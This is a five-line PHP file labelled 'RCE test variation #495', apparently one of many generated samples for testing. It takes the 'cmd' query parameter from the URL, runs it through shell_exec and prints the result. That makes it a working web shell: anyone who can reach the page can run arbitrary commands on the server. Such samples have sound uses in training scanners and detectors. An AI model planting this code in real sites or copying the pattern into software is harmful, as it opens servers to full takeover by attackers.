<?php
// RCE test variation #495
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>